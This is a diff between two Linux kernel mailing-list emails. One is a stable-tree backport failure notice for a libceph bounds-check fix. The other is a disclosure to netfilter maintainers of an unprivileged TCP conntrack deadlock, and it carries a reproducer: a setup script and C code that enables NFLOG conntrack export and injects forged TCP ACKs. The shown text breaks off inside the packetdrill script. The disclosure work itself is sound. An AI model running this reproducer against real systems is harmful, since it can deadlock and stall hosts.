@@ -1,163 +1,630 @@
-Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pf1-f174.google.com (mail-pf1-f174.google.com [209.85.210.174])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C423A488764
-	for <stable@vger.kernel.org>; Wed, 29 Jul 2026 13:48:24 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 327A1488764
+	for <stable@vger.kernel.org>; Wed, 29 Jul 2026 13:48:54 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.174
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785332908; cv=none; b=LhPe2InFWvtE+VcB0gGwtHNX6GfbtcHw+QdtNcgVjlNuDu6zIhVfN8T54b6Qkc+TrySFRo7vnzsx9729fxcYfnX+KiTWwyBue9ZcT9c68BSWeIq0kxi1iTkrhZzB7+vl5lsZAVnB80duJvVIAc4fgOARVcGQJLb7t/tKir6IgqE=
+	t=1785332943; cv=none; b=dC07qkxOqpyN9J7i3potJ4wMHASbrF5eaMbRBCMVGgBBIaORdEsWl7iUyXu7kSIcfltaNvMD+hrop2QCOevQrD5faIXN8e9KgND7mqAmAPYJzyF6rB0AE4zg8bx2AacIK0opwNQ1PPWFdvghr3/uE6/72enospJ7z2lpEvS8VcU=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785332908; c=relaxed/simple;
-	bh=3z5329sOjFQfxfSlbH5AbVzERYhYWwudI5yh6D2bpEg=;
-	h=Subject:To:Cc:From:Date:Message-ID:MIME-Version:Content-Type; b=NkpoY9WArwK+fhJVxLlIPwCrV6b8km8uoIy89ZaQZfoq2WsOohXClkyj54h1xphWqamUOLWHg729BnvHQAgDP3XiNruuxlZBjqQvRFy03Xl33YhnMnffTR2pZOWXiwpbQQzTdyQKs7443rUN7W3Lf9S8U/DHEsFirXeaGlRvgOo=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=H3AFSUco; arc=none smtp.client-ip=100.103.45.18
+	s=arc-20240116; t=1785332943; c=relaxed/simple;
+	bh=Z4vVfg8insO+Fx8K1GvZG3nxxDLCD7F8amWb4BRa22g=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=ARW8v+tMBW2ifE7gkp4ts/hwJyRmRL8WfB5NSFhFVWgfRjc04hv+uMrJoImR4X6lC4VU9VXAFr2sSZvF/ByWFkyO6l+FMgOvO3MIYzyWJP2feULuocgRP8dxhS2ed6cHbuYxLARePfSpVqQl6nR28RG0nwT3reByss+WtObkT50=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=JCqupeFj; arc=none smtp.client-ip=209.85.210.174
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="H3AFSUco"
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id C19B91F00A3E;
-	Wed, 29 Jul 2026 13:48:22 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=linuxfoundation.org;
-	s=korg; t=1785332903;
-	bh=HSadhPGS77dPB3nhXqGco0+TQZ4Ad0Eh0M76s+1Hdh4=;
-	h=Subject:To:Cc:From:Date;
-	b=H3AFSUcoXdlIJnbKSyByRJk2q9T1NDry+sS/wzHDFKhaoUGjIwmK2lGkM/P0Jw6zw
-	 Z+4Afa8Oghd9mWYg44bdO6DYwtJdeOPB1a/iPSEC+0Zb2NVLofn+PYAwtvd1g7zvgN
-	 4cVi9lr0vToeRJDKt4wK/xqlXZgtlvykcmhyZB3E=
-Subject: FAILED: patch "[PATCH] libceph: fix two unsafe bare decodes in decode_lockers()" failed to apply to 5.10-stable tree
-To: jhapavitra98@gmail.com,Slava.Dubeyko@ibm.com,idryomov@gmail.com
-Cc: <stable@vger.kernel.org>
-From: <gregkh@linuxfoundation.org>
-Date: Wed, 29 Jul 2026 15:47:49 +0200
-Message-ID: <2026072949-fresh-evolution-3660@gregkh>
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="JCqupeFj"
+Received: by mail-pf1-f174.google.com with SMTP id d2e1a72fcca58-84a4d8fd6ecso1066659b3a.1
+        for <stable@vger.kernel.org>; Wed, 29 Jul 2026 06:48:52 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1785332928; x=1785937728; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=v8SGnVDUucRqJYQttCMQUkoBYfoiBfTf1jLbIXPEVXc=;
+        b=JCqupeFj+X1HmYdq0eiq5pvPzR8ql1XWXrPTVnc80Wx4YFjp2nWVw62x3V//dfHzSj
+         xAwIeCcSqbM1Lr+THx9MbAi1Nbp7d80fIR6KH8y834Voajrt7Jasm59o0VaGVyGyrelh
+         6SoM2QRo0DDFdIPA8OwaTPUHmHgOsjSZqpe/e+OKlXQbRFemgcvcX58O7iRh9a0X+TeE
+         Cwip0uFJpVOiLoB1PcbxcHalBdiZvGHFQJb68CvzITBBJNnJ2HwJofmgJEW3iB3koj/S
+         63FwQgSQE0EPOL5mIlOwUi78jTPpu6fvRg/yyNuVd3lGOjAxa1rmHne/IYoFN+604h+G
+         acmg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1785332928; x=1785937728;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=v8SGnVDUucRqJYQttCMQUkoBYfoiBfTf1jLbIXPEVXc=;
+        b=GDrZnfS0rcreeKtcoDi2BYbUuw3yiQafEuo9l5uZ3O1r0Qs77a8rpqkWuWJ0F/AExt
+         0mVxbHX0hpTWzJhAa1LU2o+yjfiUx2vMRk9jcvH30FoxZouOQhy65aNuGxkFS/Da/UaY
+         yYVEDMLFsEZnVvan800rmfg6DIw8ZX3wzEzHIzWR/zkcoXNnvmObvTfpVHTOCxuY6WQR
+         1twYCeBxrKhJSj7cOEZEMsLAMQfPTXDb7Rl0QS1EXGeV9DqJFtK1Jmk0GANk7SaWPVDb
+         saGO3+0ysx3Ktu9y1+2leYh5WB3X8NTAuijISkVYGnBlMlRWuKOW4usgCKeHSX66pfKo
+         l41g==
+X-Forwarded-Encrypted: i=1; AHgh+RpMbmfFdgB/uopwpBxfIS/mkabMW2RHCYxNsz24dkinsdLJQk8vjpLW9j29xeYJdNN7HrGp+aE=@vger.kernel.org
+X-Gm-Message-State: AOJu0YxuDPCNf3gFMAN4GWXoV4UZRWBD5NTXGh/dIAwCfcVzSNJpgdjt
+	G+dpMTTyIz3qalD5rY4iVIpTLytmujPmQUnBSt4C3RFY7DNO2m72c33P0i+dQa2Y4Yfd
+X-Gm-Gg: AR+sD12O2Dd5RdI6mxs3c51TrHIGNvw1uu6v8miiweX/AX0tPajCZ6reBGTDQJBwXLf
+	Pp0OpQOJcEsJZsaE9zwrbrUNjUuh4HlEZ3pYgq/58El+oAY1X2on+L0F29ZHc5rL18gIIrVdg1O
+	lEcOTXJgql2jj7NXH4Jjsj406reVMjQraUB0G+I05SheEr6drrQ+paYch3CaZ8ygpu1pZiEvlvs
+	vTWf8LFBpSA0FsEGcfAccdJAArZ7ZJJvJZTtv9SW5ghpzguaJIZ400LqpoG9rgvokACT+QyIkjD
+	IVCo5vnHqfkSH3TsGpZECx7pNume3I8XRPzZophplTUbwKJChOpLukwVlD/ESctgWjWnPh4PL/O
+	w+PVi46Jlpm+DNFP7DekWzspyM9VD7uVJM5GpJDGHE9spRobY02l8gTXQNCFXyt1Os8jjU+eAtK
+	fEdCfNLd0tzVGHUtvDpGANeG0mJYDCrS8OebxkG6jbOffhgAjqGKPp/DkJDc4DqQeOlaXc0e4=
+X-Received: by 2002:a05:6a00:84e:b0:848:2f84:f427 with SMTP id d2e1a72fcca58-84e93338b86mr7201182b3a.64.1785332928239;
+        Wed, 29 Jul 2026 06:48:48 -0700 (PDT)
+Received: from localhost.localdomain ([115.192.250.185])
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84ea02ff637sm1425886b3a.39.2026.07.29.06.48.44
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Wed, 29 Jul 2026 06:48:47 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netfilter-devel@vger.kernel.org
+Cc: pablo@netfilter.org,
+	fw@strlen.de,
+	phil@nwl.cc,
+	davem@davemloft.net,
+	edumazet@google.com,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	chamaken@gmail.com,
+	vega@nebusec.ai,
+	zihanx@nebusec.ai,
+	stable@vger.kernel.org
+Subject: [PATCH nf 0/1] netfilter: fix TCP conntrack invalid-log deadlock
+Date: Wed, 29 Jul 2026 13:48:16 +0000
+Message-ID: <cover.1785307980.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: stable@vger.kernel.org
 List-Id: <stable.vger.kernel.org>
 List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=ANSI_X3.4-1968
 Content-Transfer-Encoding: 8bit
 
+Hi Linux kernel maintainers,
 
-The patch below does not apply to the 5.10-stable tree.
-If someone wants it applied there, or to any other stable or longterm
-tree, then please email the backport, including the original git commit
-id to <stable@vger.kernel.org>.
+We found and validated an issue in net/netfilter/nf_conntrack_proto_tcp.c.
+The bug is reachable by a non-root user via user and net namespace.
+We've tested it, and it should not affect any other functionality.
 
-To reproduce the conflict and resubmit, you may use the following commands:
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-git fetch https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/ linux-5.10.y
-git checkout FETCH_HEAD
-git cherry-pick -x a109a556115271ca7896dcda7b4b7e45e156c227
-# <resolve conflicts, build, test, etc.>
-git commit -s
-git send-email --to '<stable@vger.kernel.org>' --in-reply-to '2026072949-fresh-evolution-3660@gregkh' --subject-prefix 'PATCH 5.10.y' 'HEAD^..'
+---- details below ----
 
-Possible dependencies:
+Bug details:
 
+nf_conntrack_tcp_packet() can log invalid TCP packets while ct->lock is
+still held. This happens both in the tcp_in_window() -> nf_tcp_log_invalid()
+path and in the NFCT_TCP_INVALID -> nf_tcp_handle_invalid() path.
 
+When invalid logging is routed to nfnetlink_log and the NFLOG instance has
+NFULNL_CFG_F_CONNTRACK enabled, nfulnl_log_packet() re-enters conntrack
+serialization through ctnetlink_glue_build() and tcp_to_nlattr(). That
+reaches the same conntrack again and tries to take ct->lock recursively,
+which can deadlock the sender in queued_spin_lock_slowpath() and then lead
+to RCU stall reports.
 
-thanks,
+The lock-held invalid logging sites already existed before later logging
+helper refactors. The current root-cause fact becomes complete at
+Fixes: a29a9a585b28 ("netfilter: nfnetlink_log: allow to attach conntrack")
+because that commit first makes NFLOG export conntrack state from the
+logging path. The later d48668052b26 change only broadens/restores one
+helper-triggered logging surface and is not the first root-cause commit.
 
-greg k-h
+This patch keeps the existing invalid-packet decisions and messages, but
+records only the minimal logging context while ct->lock is held and emits
+the real log after spin_unlock_bh(&ct->lock). That removes the recursive
+lock acquisition without narrowing the invalid-path coverage.
 
------------------- original commit in Linus's tree ------------------
+Reproducer:
 
-From a109a556115271ca7896dcda7b4b7e45e156c227 Mon Sep 17 00:00:00 2001
-From: Pavitra Jha <jhapavitra98@gmail.com>
-Date: Tue, 2 Jun 2026 00:17:35 -0400
-Subject: [PATCH] libceph: fix two unsafe bare decodes in decode_lockers()
+    gcc -O2 -static -o poc poc.c
+    unshare -Urn ./poc
 
-decode_lockers() in cls_lock_client.c contains two bare decode operations
-that allow a malicious or compromised OSD to trigger slab-out-of-bounds
-reads:
+The two lines above are kept to match the required cover-letter template.
+The actual runnable reproducer for this bug is the wrapper flow below.
 
-1. ceph_decode_32(p) at the num_lockers field has no preceding bounds
-   check. ceph_start_decoding() accepts struct_len=0 as valid -- the
-   internal ceph_decode_need(p, end, 0, bad) always passes -- so when an
-   OSD sends struct_len=0, ceph_start_decoding() returns success with
-   p == end. The immediately following bare ceph_decode_32(p) then reads
-   4 bytes past the validated buffer boundary. The garbage value is
-   passed directly to kzalloc_objs() as the locker count.
+Actual files used in this reproduction:
 
-   The sibling function decode_watchers() in osd_client.c already uses
-   ceph_decode_32_safe() after its own ceph_start_decoding() call.
-   decode_lockers() was the only site using the bare variant.
+    chmod +x run-poc-packetdrill.sh
+    unshare -Urn ./run-poc-packetdrill.sh
 
-2. ceph_decode_8(p) after the decode_locker() loop has no preceding
-   bounds check. If an OSD crafts num_lockers such that the loop
-   advances p exactly to end, the subsequent bare ceph_decode_8(p) reads
-   one byte past the validated buffer boundary. The result is passed
-   directly into *type, which is used as a lock type discriminator by
-   callers, giving an OSD-controlled one-byte OOB read with direct
-   influence over the lock type field.
+The wrapper script compiles poc-packetdrill-helper.c, starts
+./poc-packetdrill-helper nflog to enable an NFLOG instance with
+NFULNL_CFG_F_CONNTRACK, and then runs packetdrill with
+poc-packetdrill.pkt.
 
-Fix both by replacing bare operations with their safe variants:
-  ceph_decode_32(p) -> ceph_decode_32_safe(p, end, *num_lockers,
-                                           err_inval)
-  ceph_decode_8(p)  -> ceph_decode_8_safe(p, end, *type,
-                                          err_free_lockers)
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
 
-The goto targets differ intentionally:
-  err_inval: is a new label returning -EINVAL directly. It is used for
-  the pre-allocation failure path where *lockers is not yet allocated
-  and must not be passed to ceph_free_lockers().
+------BEGIN run-poc-packetdrill.sh------
+#!/bin/sh
+set -eu
 
-  err_free_lockers: is the existing label. It is used for the
-  post-allocation failure path where *lockers is allocated and must
-  be freed.
+DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
+HELPER="$DIR/poc-packetdrill-helper"
+SCRIPT="$DIR/poc-packetdrill.pkt"
+NFLOG_OUT="$DIR/verify/poc-packetdrill-nflog.txt"
+PD_OUT="$DIR/verify/poc-packetdrill-run.txt"
+ENV_OUT="$DIR/verify/poc-packetdrill-env.txt"
 
-ret is set to -EINVAL before ceph_decode_8_safe() so that
-err_free_lockers returns the correct error code on bounds violation.
-Without this, err_free_lockers would return a stale ret value (0 from
-the successful decode_locker() loop), silently swallowing the error.
+log_env() {
+	{
+		printf '=== %s ===\n' "$1"
+		id
+		uname -a
+		printf -- 'nf_conntrack_log_invalid='
+		cat /proc/sys/net/netfilter/nf_conntrack_log_invalid 2>/dev/null || true
+		printf -- 'nf_log/2='
+		cat /proc/sys/net/netfilter/nf_log/2 2>/dev/null || true
+		printf -- 'nfnetlink_log proc:\n'
+		cat /proc/net/netfilter/nfnetlink_log 2>/dev/null || true
+		printf '\n'
+	} >>"$ENV_OUT"
+}
 
--EINVAL is correct for both failure paths. The data received from the
-OSD is structurally malformed. -ENOMEM would misrepresent the failure
-class to callers and to stable@ backporters triaging error paths.
+if ! command -v packetdrill >/dev/null 2>&1; then
+	echo "packetdrill not found in PATH" >&2
+	exit 127
+fi
 
-Attacker model: a malicious or compromised OSD in a multi-tenant Ceph
-deployment can trigger this against any kernel client that issues the
-lock.get_info class method (e.g. during RBD exclusive lock acquisition).
+export XTABLES_LOCKFILE=${XTABLES_LOCKFILE:-/tmp/xtables.lock}
+: >"$ENV_OUT"
 
-[ idryomov: trim changelog, formatting ]
+log_env before_setup
 
-Cc: stable@vger.kernel.org
-Fixes: d4ed4a530562 ("libceph: support for lock.lock_info")
-Signed-off-by: Pavitra Jha <jhapavitra98@gmail.com>
-Reviewed-by: Viacheslav Dubeyko <Slava.Dubeyko@ibm.com>
-Signed-off-by: Ilya Dryomov <idryomov@gmail.com>
+modprobe nfnetlink_log 2>>"$ENV_OUT" || true
+printf 'nfnetlink_log' >/proc/sys/net/netfilter/nf_log/2 2>>"$ENV_OUT" || true
 
-diff --git a/net/ceph/cls_lock_client.c b/net/ceph/cls_lock_client.c
-index c6956f1df333..377336982f7d 100644
---- a/net/ceph/cls_lock_client.c
-+++ b/net/ceph/cls_lock_client.c
-@@ -299,7 +299,7 @@ static int decode_lockers(void **p, void *end, u8 *type, char **tag,
- 	if (ret)
- 		return ret;
- 
--	*num_lockers = ceph_decode_32(p);
-+	ceph_decode_32_safe(p, end, *num_lockers, err_inval);
- 	*lockers = kzalloc_objs(**lockers, *num_lockers, GFP_NOIO);
- 	if (!*lockers)
- 		return -ENOMEM;
-@@ -310,7 +310,8 @@ static int decode_lockers(void **p, void *end, u8 *type, char **tag,
- 			goto err_free_lockers;
- 	}
- 
--	*type = ceph_decode_8(p);
-+	ret = -EINVAL;
-+	ceph_decode_8_safe(p, end, *type, err_free_lockers);
- 	s = ceph_extract_encoded_string(p, end, NULL, GFP_NOIO);
- 	if (IS_ERR(s)) {
- 		ret = PTR_ERR(s);
-@@ -320,6 +321,9 @@ static int decode_lockers(void **p, void *end, u8 *type, char **tag,
- 	*tag = s;
- 	return 0;
- 
-+err_inval:
-+	return -EINVAL;
-+
- err_free_lockers:
- 	ceph_free_lockers(*lockers, *num_lockers);
- 	return ret;
+/usr/sbin/ip link set lo up
+/usr/sbin/iptables-legacy -F
+/usr/sbin/iptables-legacy -A INPUT -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
+/usr/sbin/iptables-legacy -A OUTPUT -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
+printf '6\n' > /proc/sys/net/netfilter/nf_conntrack_log_invalid
+
+log_env after_setup
+
+gcc -O2 -Wall -Wextra -o "$HELPER" "$DIR/poc-packetdrill-helper.c"
+
+"$HELPER" nflog >"$NFLOG_OUT" 2>&1 &
+NFLOG_PID=$!
+cleanup() {
+	kill "$NFLOG_PID" 2>/dev/null || true
+	wait "$NFLOG_PID" 2>/dev/null || true
+}
+trap cleanup EXIT INT TERM
+
+packetdrill \
+	--local_ip=192.0.2.1 \
+	--remote_ip=192.0.2.2 \
+	--gateway_ip=192.0.2.2 \
+	--bind_port=8080 \
+	"$SCRIPT" >"$PD_OUT" 2>&1
+wait "$NFLOG_PID"
+trap - EXIT INT TERM
+------END run-poc-packetdrill.sh--------
+
+------BEGIN poc-packetdrill-helper.c------
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/netfilter/nfnetlink.h>
+#include <linux/netfilter/nfnetlink_conntrack.h>
+#include <linux/netfilter/nfnetlink_log.h>
+#include <linux/netlink.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/poll.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define IPV4_FAMILY 2
+#define PROC_TCP_PATH "/proc/net/tcp"
+
+static uint32_t nl_seq;
+
+static void die(const char *msg)
+{
+	perror(msg);
+	exit(EXIT_FAILURE);
+}
+
+static struct nlattr *nlattr_put(struct nlmsghdr *nlh, size_t maxlen,
+				 uint16_t type, const void *data, uint16_t len)
+{
+	size_t attr_len = NLA_HDRLEN + len;
+	size_t total = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(attr_len);
+	struct nlattr *nla;
+
+	if (total > maxlen) {
+		errno = ENOSPC;
+		return NULL;
+	}
+
+	nla = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
+	nla->nla_type = type;
+	nla->nla_len = attr_len;
+	memcpy((char *)nla + NLA_HDRLEN, data, len);
+	memset((char *)nla + attr_len, 0, NLA_ALIGN(attr_len) - attr_len);
+	nlh->nlmsg_len = total;
+	return nla;
+}
+
+static void recv_ack(int fd, uint32_t seq)
+{
+	char buf[4096];
+	struct nlmsghdr *nlh;
+	ssize_t len;
+
+	len = recv(fd, buf, sizeof(buf), 0);
+	if (len < 0)
+		die("recv netlink");
+
+	for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, (unsigned int)len);
+	     nlh = NLMSG_NEXT(nlh, len)) {
+		if (nlh->nlmsg_seq != seq)
+			continue;
+		if (nlh->nlmsg_type == NLMSG_ERROR) {
+			struct nlmsgerr *err = NLMSG_DATA(nlh);
+
+			if (err->error) {
+				errno = -err->error;
+				die("netlink ack");
+			}
+			return;
+		}
+	}
+
+	fprintf(stderr, "missing netlink ack for seq=%u\n", seq);
+	exit(EXIT_FAILURE);
+}
+
+static void send_config_msg(int fd, uint8_t family, uint16_t group,
+			    bool with_cmd, uint8_t cmd,
+			    bool with_mode, uint8_t mode, uint32_t range,
+			    bool with_flags, uint16_t flags)
+{
+	char buf[512];
+	struct {
+		struct nlmsghdr nlh;
+		struct nfgenmsg nfg;
+	} *req = (void *)buf;
+
+	memset(buf, 0, sizeof(buf));
+	req->nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req->nfg));
+	req->nlh.nlmsg_type = (NFNL_SUBSYS_ULOG << 8) | NFULNL_MSG_CONFIG;
+	req->nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+	req->nlh.nlmsg_seq = ++nl_seq;
+	req->nfg.nfgen_family = family;
+	req->nfg.version = NFNETLINK_V0;
+	req->nfg.res_id = htons(group);
+
+	if (with_cmd) {
+		struct nfulnl_msg_config_cmd cfg = {
+			.command = cmd,
+		};
+
+		if (!nlattr_put(&req->nlh, sizeof(buf), NFULA_CFG_CMD,
+				&cfg, sizeof(cfg)))
+			die("nlattr_put cmd");
+	}
+
+	if (with_mode) {
+		struct nfulnl_msg_config_mode cfg = {
+			.copy_range = htonl(range),
+			.copy_mode = mode,
+		};
+
+		if (!nlattr_put(&req->nlh, sizeof(buf), NFULA_CFG_MODE,
+				&cfg, sizeof(cfg)))
+			die("nlattr_put mode");
+	}
+
+	if (with_flags) {
+		__be16 be_flags = htons(flags);
+
+		if (!nlattr_put(&req->nlh, sizeof(buf), NFULA_CFG_FLAGS,
+				&be_flags, sizeof(be_flags)))
+			die("nlattr_put flags");
+	}
+
+	if (send(fd, buf, req->nlh.nlmsg_len, 0) < 0)
+		die("send netlink");
+	recv_ack(fd, req->nlh.nlmsg_seq);
+}
+
+static int setup_nflog(void)
+{
+	struct sockaddr_nl addr = {
+		.nl_family = AF_NETLINK,
+	};
+	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
+
+	if (fd < 0)
+		die("socket NETLINK_NETFILTER");
+	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+		die("bind NETLINK_NETFILTER");
+
+	send_config_msg(fd, IPV4_FAMILY, 0, true, NFULNL_CFG_CMD_PF_BIND,
+			false, 0, 0, false, 0);
+	send_config_msg(fd, IPV4_FAMILY, 0, true, NFULNL_CFG_CMD_BIND,
+			false, 0, 0, false, 0);
+	send_config_msg(fd, IPV4_FAMILY, 0, false, 0,
+			true, NFULNL_COPY_META, 0, true,
+			NFULNL_CFG_F_CONNTRACK);
+
+	return fd;
+}
+
+static int wait_nflog(void)
+{
+	char buf[4096];
+	struct pollfd pfd;
+	int fd, ret;
+
+	fd = setup_nflog();
+	pfd.fd = fd;
+	pfd.events = POLLIN;
+	ret = poll(&pfd, 1, 2000);
+	if (ret < 0)
+		die("poll nflog");
+	if (ret == 0) {
+		fprintf(stderr, "no NFLOG packet received within 2 seconds\n");
+		close(fd);
+		return 1;
+	}
+	ret = recv(fd, buf, sizeof(buf), 0);
+	if (ret < 0)
+		die("recv nflog packet");
+	fprintf(stderr, "received NFLOG packet (%d bytes)\n", ret);
+	close(fd);
+	return 0;
+}
+
+static uint16_t csum16(const void *data, size_t len)
+{
+	const uint16_t *p = data;
+	uint32_t sum = 0;
+
+	while (len > 1) {
+		sum += *p++;
+		len -= 2;
+	}
+	if (len)
+		sum += *(const uint8_t *)p;
+	while (sum >> 16)
+		sum = (sum & 0xffff) + (sum >> 16);
+	return (uint16_t)~sum;
+}
+
+static uint16_t tcp_checksum(const struct iphdr *iph, const struct tcphdr *tcph)
+{
+	struct {
+		uint32_t saddr;
+		uint32_t daddr;
+		uint8_t zero;
+		uint8_t proto;
+		uint16_t len;
+		struct tcphdr tcph;
+	} pseudo = {
+		.saddr = iph->saddr,
+		.daddr = iph->daddr,
+		.zero = 0,
+		.proto = IPPROTO_TCP,
+		.len = htons(sizeof(struct tcphdr)),
+		.tcph = *tcph,
+	};
+
+	return csum16(&pseudo, sizeof(pseudo));
+}
+
+static int find_established_tuple(uint16_t listen_port,
+				 struct in_addr *src_ip, uint16_t *src_port,
+				 struct in_addr *dst_ip, uint16_t *dst_port)
+{
+	FILE *fp;
+	char line[512];
+
+	fp = fopen(PROC_TCP_PATH, "r");
+	if (!fp)
+		die(PROC_TCP_PATH);
+
+	if (!fgets(line, sizeof(line), fp)) {
+		fclose(fp);
+		return -1;
+	}
+
+	while (fgets(line, sizeof(line), fp)) {
+		unsigned int sl;
+		unsigned int lip_hex, lport_hex, rip_hex, rport_hex, state;
+		struct in_addr lip, rip;
+
+		if (sscanf(line,
+			   " %u: %8X:%4X %8X:%4X %2X",
+			   &sl, &lip_hex, &lport_hex, &rip_hex, &rport_hex, &state) != 6)
+			continue;
+		if (state != 0x01)
+			continue;
+		if (lport_hex != listen_port)
+			continue;
+
+		lip.s_addr = lip_hex;
+		rip.s_addr = rip_hex;
+		*src_ip = rip;
+		*src_port = (uint16_t)rport_hex;
+		*dst_ip = lip;
+		*dst_port = (uint16_t)lport_hex;
+		fclose(fp);
+		return 0;
+	}
+
+	fclose(fp);
+	return -1;
+}
+
+static void inject_invalid_from_proc(uint16_t listen_port,
+				     uint32_t seq, uint32_t ack_seq)
+{
+	struct {
+		struct iphdr ip;
+		struct tcphdr tcp;
+	} pkt;
+	struct sockaddr_in dst = {
+		.sin_family = AF_INET,
+	};
+	struct in_addr src_ip, dst_ip;
+	uint16_t src_port, dst_port;
+	int one = 1;
+	int fd;
+
+	if (find_established_tuple(listen_port, &src_ip, &src_port,
+				    &dst_ip, &dst_port) < 0) {
+		errno = ENOENT;
+		die("find_established_tuple");
+	}
+
+	fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+	if (fd < 0)
+		die("socket raw");
+	if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
+		die("setsockopt IP_HDRINCL");
+
+	dst.sin_addr = dst_ip;
+	memset(&pkt, 0, sizeof(pkt));
+	pkt.ip.version = 4;
+	pkt.ip.ihl = sizeof(pkt.ip) / 4;
+	pkt.ip.tot_len = htons(sizeof(pkt));
+	pkt.ip.ttl = 64;
+	pkt.ip.protocol = IPPROTO_TCP;
+	pkt.ip.saddr = src_ip.s_addr;
+	pkt.ip.daddr = dst_ip.s_addr;
+	pkt.ip.check = csum16(&pkt.ip, sizeof(pkt.ip));
+
+	pkt.tcp.source = htons(src_port);
+	pkt.tcp.dest = htons(dst_port);
+	pkt.tcp.seq = htonl(seq);
+	pkt.tcp.ack_seq = htonl(ack_seq);
+	pkt.tcp.doff = sizeof(pkt.tcp) / 4;
+	pkt.tcp.ack = 1;
+	pkt.tcp.window = htons(1024);
+	pkt.tcp.check = tcp_checksum(&pkt.ip, &pkt.tcp);
+
+	fprintf(stderr,
+		"injecting forged ACK %s:%u -> %s:%u seq=%#x ack=%#x\n",
+		inet_ntoa(src_ip), src_port, inet_ntoa(dst_ip), dst_port,
+		seq, ack_seq);
+
+	if (sendto(fd, &pkt, sizeof(pkt), 0,
+		   (struct sockaddr *)&dst, sizeof(dst)) < 0)
+		die("sendto raw");
+	close(fd);
+}
+
+int main(int argc, char **argv)
+{
+	if (argc >= 2 && !strcmp(argv[1], "nflog"))
+		return wait_nflog();
+	if (argc == 5 && !strcmp(argv[1], "inject-from-proc")) {
+		uint16_t listen_port = (uint16_t)strtoul(argv[2], NULL, 0);
+		uint32_t seq = (uint32_t)strtoul(argv[3], NULL, 0);
+		uint32_t ack_seq = (uint32_t)strtoul(argv[4], NULL, 0);
+
+		inject_invalid_from_proc(listen_port, seq, ack_seq);
+		return 0;
+	}
+
+	fprintf(stderr,
+		"usage: %s nflog | inject-from-proc <listen_port> <seq> <ack>\n",
+		argv[0]);
+	return 2;
+}
+------END poc-packetdrill-helper.c--------
+
+------BEGIN poc-packetdrill.pkt------
+// packetdrill version of the TCP conntrack invalid-log deadlock PoC.
+//
+// This script uses packetdrill for the TCP state machine part and a small
+// helper binary for the two userspace-only tasks that packetdrill does not
+// cover well here:
+//   1) enabling an NFLOG instance with NFULNL_CFG_F_CONNTRACK
